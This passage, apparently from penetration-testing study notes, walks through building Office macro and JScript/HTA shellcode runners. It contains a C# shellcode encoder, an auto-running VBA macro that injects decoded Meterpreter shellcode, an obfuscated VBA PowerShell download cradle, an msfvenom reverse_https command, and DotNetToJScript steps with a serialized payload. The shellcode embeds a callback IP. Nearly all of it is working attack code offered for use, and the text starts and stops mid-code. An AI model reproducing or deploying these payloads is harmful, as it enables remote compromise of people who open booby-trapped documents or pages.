                0x33,0x4b,0x45,0x77,0x49,0x52,0x63,0x35,0x47,0x4a,0x6e,0x62,
                0x4d,0x4b,0x79,0x35,0x41,0x33,0x4d,0x6e,0x4a,0x2d,0x34,0x30,
                0x33,0x54,0x67,0x53,0x68,0x36,0x74,0x65,0x39,0x6f,0x37,0x77,
                0x78,0x32,0x37,0x56,0x4b,0x55,0x4b,0x66,0x4f,0x31,0x68,0x56,
                0x4a,0x55,0x35,0x4e,0x65,0x65,0x32,0x61,0x77,0x50,0x59,0x35,
                0x61,0x50,0x42,0x6e,0x66,0x74,0x63,0x56,0x4c,0x33,0x78,0x43,
                0x6c,0x34,0x2d,0x67,0x6a,0x47,0x49,0x59,0x4e,0x46,0x4e,0x4a,
                0x6a,0x62,0x71,0x59,0x78,0x59,0x73,0x46,0x4c,0x38,0x68,0x7a,
                0x4d,0x73,0x39,0x39,0x63,0x67,0x57,0x61,0x69,0x73,0x5f,0x35,
                0x65,0x7a,0x41,0x64,0x4d,0x76,0x6b,0x76,0x58,0x4b,0x77,0x4d,
                0x47,0x4b,0x46,0x76,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,
                0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,0x84,0x53,0x53,0x53,
                0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,
                0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,
                0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,
                0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,
                0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,0x44,0xf0,0x35,0xe0,
                0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,
                0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,
                0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,
                0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,
                0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,
                0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x39,
                0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x31,0x37,0x34,
                0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5};

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
            File.AppendAllText("test.txt", hex.ToString());
        }
    }
}

```

Run the file to obtain encrypted payload, and insert it to VBA. Remember that the Macro must be attached to the current document and not anything else.
![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/aee2ede3-7599-43e4-8325-33d06e1d219a/95983bb5-30a9-428b-9e62-5423fc5925ce/Untitled.png)

```bash
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(254, 234, 145, 2, 2, 2, 98, 139, 231, 51, 212, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 141, 116, 42, 17, 185, 76, 40, 51, 1, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 141, 84, _
18, 141, 68, 62, 3, 210, 89, 141, 66, 122, 135, 194, 118, 78, 3, 210, 141, 74, 26, 82, 141, 90, 34, 3, 213, 135, 203, 118, 62, 51, 1, 75, 141, 54, 141, 3, 216, 51, 194, 174, 195, 209, 15, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 86, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 79, 99, 101, 107, 112, 118, 113, _
117, 106, 61, 34, 75, 112, 118, 103, 110, 34, 79, 99, 101, 34, 81, 85, 34, 90, 34, 51, 54, 48, 54, 61, 34, 116, 120, 60, 51, 52, 54, 48, 50, 43, 34, 73, 103, 101, 109, 113, 49, 52, 50, 51, 50, 50, 51, 50, 51, 34, _
72, 107, 116, 103, 104, 113, 122, 49, 51, 52, 54, 48, 50, 2, 106, 60, 88, 123, 169, 1, 215, 85, 85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 117, 3, 2, 2, 49, 57, 57, 92, 77, 83, 97, 118, 120, 69, 50, 82, 118, _
76, 119, 121, 112, 107, 57, 116, 115, 51, 83, 76, 102, 70, 119, 92, 124, 101, 86, 89, 89, 101, 85, 55, 87, 113, 54, 97, 54, 73, 86, 78, 117, 77, 122, 120, 58, 80, 86, 116, 118, 68, 77, 120, 112, 78, 68, 82, 59, 70, 101, _
124, 79, 88, 52, 113, 78, 91, 124, 77, 106, 117, 117, 99, 89, 67, 70, 67, 74, 107, 90, 115, 91, 58, 124, 124, 115, 84, 74, 75, 122, 104, 78, 71, 100, 115, 78, 82, 104, 52, 78, 53, 77, 71, 121, 75, 84, 101, 55, 73, 76, _
112, 100, 79, 77, 123, 55, 67, 53, 79, 112, 76, 47, 54, 50, 53, 86, 105, 85, 106, 56, 118, 103, 59, 113, 57, 121, 122, 52, 57, 88, 77, 87, 77, 104, 81, 51, 106, 88, 76, 87, 55, 80, 103, 103, 52, 99, 121, 82, 91, 55, _
99, 82, 68, 112, 104, 118, 101, 88, 78, 53, 122, 69, 110, 54, 47, 105, 108, 73, 75, 91, 80, 72, 80, 76, 108, 100, 115, 91, 122, 91, 117, 72, 78, 58, 106, 124, 79, 117, 59, 59, 101, 105, 89, 99, 107, 117, 97, 55, 103, 124, _
67, 102, 79, 120, 109, 120, 90, 77, 121, 79, 73, 77, 72, 120, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, _
53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, _
77, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, _
3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 55, 48, 51, 57, 54, 2, 189, 242, 183, 164, 88, 108, 2, 85, 1, 215)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
```

PowerShell download cradle embedded in obfuscated VBA.

```bash
Function GJKN(UUJJSJS)
    GJKN = Chr(UUJJSJS - 17)
End Function
Function KKSLKASDM(AOISNMDOIASND)
    KKSLKASDM = OIASNDOIN(AOISNMDOIASND, 3)
End Function
Function NAIOSND(NSNDNS)
    NAIOSND = AOSDN(NSNDNS, Len(NSNDNS) - 3)
End Function
Function OOSLASD(WKNWIONDQ)
Do
    YHDFGHJ = YHDFGHJ + GJKN(KKSLKASDM(WKNWIONDQ))
    WKNWIONDQ = NAIOSND(WKNWIONDQ)
    Loop While Len(WKNWIONDQ) > 0
    OOSLASD = YHDFGHJ
End Function
Function MyMacro()
    Dim KSIWKSSS As String
    Dim SKSKSKJDJD As String
    
    If ActiveDocument.Name <> OOSLASD("123128115112114129129125122116114133122128127063117128116126") Then
        Exit Function
    End If
    
    KSIWKSSS = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069070063067068067064131134127063133137133056058058"
    SKSKSKJDJD = OOSLASD(KSIWKSSS)
    GetObject(OOSLASD("136122127126120126133132075")).Get(OOSLASD("104122127068067112097131128116118132132")).Create SKSKSKJDJD, LAKSD, ASNDWOI, OIWADNQOIS
End Function
```

### DotNetToJScript (Jscript RCE, HTA RCE)

Go to

```bash
C:\Tools\DotNetToJScript-master\DotNetToJScript-master\DotNetToJScript\bin\Release
```

Copy these two files to C:\Tools.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/aee2ede3-7599-43e4-8325-33d06e1d219a/11a1bf2d-fb69-419b-aa78-47a2f02cdd41/Untitled.png)

Then navigate to

```bash
C:\Tools\DotNetToJScript-master\DotNetToJScript-master\ExampleAssembly\bin\Release
```

Copy this file to C:\Tools.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/aee2ede3-7599-43e4-8325-33d06e1d219a/2b5863a8-9190-49a8-8c82-2226746237ac/Untitled.png)

Then test if it works, we should get a popup.

```bash
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/aee2ede3-7599-43e4-8325-33d06e1d219a/65045205-4b47-45a4-8e5a-19f98f431252/Untitled.png)

Now, we’ll generate a shellcode.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 -f csharp
```

```bash
//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public TestClass()
    {
        byte[] buf = new byte[608] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
            0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
            0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
            0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
            0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,
            0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,
            0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,
            0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,0x48,
            0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,
            0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
            0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,
            0x2e,0x34,0x35,0x2e,0x31,0x37,0x34,0x00,0x5a,0x48,0x89,0xc1,
            0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,
            0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
            0x00,0xff,0xd5,0xe8,0x36,0x00,0x00,0x00,0x2f,0x51,0x64,0x67,
            0x37,0x70,0x72,0x67,0x73,0x4d,0x43,0x68,0x6a,0x66,0x57,0x4a,
            0x5f,0x42,0x65,0x47,0x52,0x4a,0x41,0x47,0x4f,0x59,0x50,0x74,
            0x50,0x41,0x2d,0x6b,0x7a,0x43,0x63,0x39,0x55,0x55,0x6e,0x5f,
            0x38,0x73,0x4a,0x6e,0x47,0x51,0x34,0x62,0x47,0x46,0x34,0x7a,
            0x42,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
            0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,
            0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,
            0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,
            0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,
            0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
            0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,
            0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,
            0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,
            0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,
            0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
            0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,
            0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,
            0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,
            0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,
            0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
            0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,
            0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,
            0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,
            0xff,0xd5};

        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/aee2ede3-7599-43e4-8325-33d06e1d219a/cd5e6ee4-03a8-45ec-b756-bf60f0b46c3e/Untitled.png)

We’ll then navigate to

```bash
C:\Tools\DotNetToJScript-master\DotNetToJScript-master\ExampleAssembly\bin\x64\Release
```

and copy the ExampleAssembly.dll to C:\Tools. Then run the following at C:\Tools

```bash
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

We’ll then obtain the reverse shell. Next, we’ll open the js file with Notepad, then copy the contents into details.hta.

```bash
<html>
<head>
<script language="JScript">

function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABYAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAZfOcZgAAAAAA"+
"AAAA8AAiIAsCMAAADgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABkKQAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA/AwAAAAgAAAADgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAQAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAvCAAAKgIAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBgBdAAAAAQAAEQIoDwAA"+
"CiBgAgAAjRIAAAEl0AEAAAQoEAAACiWOaQp+EQAACiAAEAAAIAAwAAAfQCgBAAAGCxYHBigSAAAK"+
"fhEAAAoWB34RAAAKFn4RAAAKKAIAAAYVKAMAAAYmKiIDKBMAAAomKgAAQlNKQgEAAQAAAAAADAAA"+
"AHYyLjAuNTA3MjcAAAAABQBsAAAAAAMAACN+AABsAwAA7AMAACNTdHJpbmdzAAAAAFgHAAAEAAAA"+
"I1VTAFwHAAAQAAAAI0dVSUQAAABsBwAAPAEAACNCbG9iAAAAAAAAAAIAAAFXlQI0CQIAAAD6ATMA"+
"FgAAAQAAABgAAAAEAAAAAQAAAAUAAAANAAAAEwAAAA8AAAABAAAAAQAAAAEAAAADAAAAAQAAAAEA"+
"AAACAAAAAQAAAAAAhQIBAAAAAAAGAMgBEQMGADUCEQMGABUB0AIPADEDAAAGAD0BoAIGAKsBoAIG"+
"AIwBoAIGABwCoAIGAOgBoAIGAAECoAIGAFQBoAIGACkB8gIGAAcB8gIGAG8BoAIGAK0DmQIGAOwA"+
"EQMGANEAmQIGAFMCmQIGAGMDEQMGAM4DmQIGALYAmQIGAMkCmQIGAHAC8gIKAH8D0AIAAAAAYAAA"+
"AAAAAQABAAEAEAByAwAAPQABAAEAAAEAAGkAAAA9AAEABgATAQAAQgAAAEUAAgAGADMBAQBCAAAA"+
"AACAAJEgkQBGAAEAAAAAAIAAkSCpAE4ABQAAAAAAgACRIKADWAALAEggAAAAAIYYwwIGAA0AsSAA"+
"AAAAhgB8AxAADQAAAAEAhwMAAAIAZAIAAAMA2wAAAAQAtAMAAAEAQAMAAAIAWAIAAAMAkQMAAAQA"+
"twIAAAUAUwMAAAYAngAAAAEAyQAAAAIA4wIAAAEAawIJAMMCAQARAMMCBgAZAMMCCgApAMMCEAAx"+
"AMMCEAA5AMMCEABBAMMCEABJAMMCEABRAMMCEABZAMMCEABhAMMCFQBpAMMCEABxAMMCEACBAMMC"+
"BgB5AMMCBgCZAMQDHwCxALICJwC5AOQDKgDBAL4DMwAuAAsAXgAuABMAZwAuABsAhgAuACMAjwAu"+
"ACsApAAuADMAzgAuADsAzgAuAEMAjwAuAEsA1AAuAFMAzgAuAFsAzgAuAGMA+QAuAGsAIwFDAFsA"+
"MAFjAHMANgEBAGACAAAEABoAeAJBAQMAkQABAAABBQCpAAEAAAEHAKADAQCcKgAAAQAEgAAAAQAA"+
"AAAAAAAAAAAAAADUAwAAAgAAAAAAAAAAAAAAOQCIAAAAAAACAAAAAAAAAAAAAAA5AJkCAAAAAAQA"+
"AwAAAAAAAEYxNTJFQzE4RTU3QUMzNEVFREEyNTBGOTU0NjcwOTJENDg1RDZFMDVBQjVCMTNCNjk5"+
"QUY0MUEyRDU1MUE4NDUAX19TdGF0aWNBcnJheUluaXRUeXBlU2l6ZT02MDgAPE1vZHVsZT4APFBy"+
"aXZhdGVJbXBsZW1lbnRhdGlvbkRldGFpbHM+AG1zY29ybGliAFZpcnR1YWxBbGxvYwBscFRocmVh"+
"ZElkAENyZWF0ZVRocmVhZABSdW50aW1lRmllbGRIYW5kbGUAaEhhbmRsZQBWYWx1ZVR5cGUAZmxB"+
"bGxvY2F0aW9uVHlwZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERl"+
"YnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmli"+
"dXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1"+
"dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRy"+
"aWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRy"+
"aWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRl"+
"AFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAZHdTdGFja1NpemUAZHdTaXplAHBh"+
"dGgATWFyc2hhbABrZXJuZWwzMi5kbGwARXhhbXBsZUFzc2VtYmx5LmRsbABTeXN0ZW0AU3lzdGVt"+
"LlJlZmxlY3Rpb24AWmVybwBscFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0"+
"aWNzAGR3TWlsbGlzZWNvbmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0u"+
"UnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRl"+
"cwBkd0NyZWF0aW9uRmxhZ3MAUnVudGltZUhlbHBlcnMAVGVzdENsYXNzAFJ1blByb2Nlc3MAbHBB"+
"ZGRyZXNzAGxwU3RhcnRBZGRyZXNzAFdhaXRGb3JTaW5nbGVPYmplY3QAZmxQcm90ZWN0AFN0YXJ0"+
